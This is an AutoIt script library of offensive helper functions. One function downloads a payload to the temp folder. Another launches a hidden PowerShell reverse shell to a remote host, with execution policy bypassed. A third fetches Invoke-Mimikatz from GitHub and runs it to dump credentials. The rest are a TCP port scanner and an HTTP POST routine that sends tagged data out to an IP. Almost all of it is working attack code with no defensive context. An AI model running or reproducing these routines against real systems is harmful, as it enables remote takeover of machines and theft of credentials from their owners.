#include <Inet.au3>

;download a file from an http server - path: C:\Users\name\AppData\Local\Temp\drop.tmp
Func HttpDownloadFile($sURL, $FileName = @TempDir & "\drop.tmp")
   InetGet($sURL, $FileName, 1, 1)
EndFunc

;reverse shell using powershell
Func ReverseShell($RemoteIp, $RemotePort)
   $buffer = "$client = [System.Net.Sockets.TCPClient]::new('" & $RemoteIp & "'," & $RemotePort & ");[byte[]]$bytes = (0..65535).ForEach{ 0 };$stream = $client.GetStream();while ($i = $stream.Read($bytes, 0, $bytes.Length)) {$data = [System.Text.Encoding]::ASCII.GetString($bytes, 0, $i);$sendback = (Invoke-Expression -Command $data 2>&1 | Out-String);$prompt = $sendback + 'PS ' + $PWD.Path + '> ';$sendbyte = ([System.Text.Encoding]::ASCII).GetBytes($prompt);$stream.Write($sendbyte, 0, $sendbyte.Length);$stream.Flush()};$client.Close()"
   RunWait("C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden -nop -exec bypass -c " & " " & $buffer);
EndFunc

;Mimikatz
Func Mimikatz()
   $buffer = "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds";
   RunWait("C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden -nop -exec bypass -C " & " " & $buffer);
EndFunc

;check if internet is up
Func InternetCheck()
    Local $iPing = Ping("wikipedia.org", 250)
    If $iPing Then
        return 1
    Else
        return 0
    EndIf
 EndFunc

;read remote http/s page
Func ReadRemoteVar($url)
   return _INetGetSource($url) & @crlf
EndFunc

;TCP scanner
Func TCPscanner($ip,$port)
   TCPStartup()
   $result = TCPConnect($ip,$port)
   Sleep(1)
   TCPShutdown()
   if $result > 0 Then
	  Return "open"
   Else
	  Return "closed"
   EndIf
EndFunc

;Send data over Http
Global Const $HTTP_STATUS_OK = 200

Func HttpPost($ip, $tag, $sData = "")
   if TCPscanner($ip, "80") == "open" Then
	  Local $oHTTP = ObjCreate("WinHttp.WinHttpRequest.5.1")
	  $oHTTP.Open("POST", "http://" & $ip, False)
	  If (@error) Then Return 0
	  $oHTTP.SetRequestHeader("Content-Type", "application/x-www-form-urlencoded")
	  $oHTTP.Send("#" & $tag & ": " & $sData)
	  sleep(5000)
	  If (@error) Then Return 0
	  If ($oHTTP.Status <> $HTTP_STATUS_OK) Then Return SetError(3, 0, 0)
	  Return SetError(0, 0, $oHTTP.ResponseText)
   Else
	  Return 0
   EndIf
EndFunc
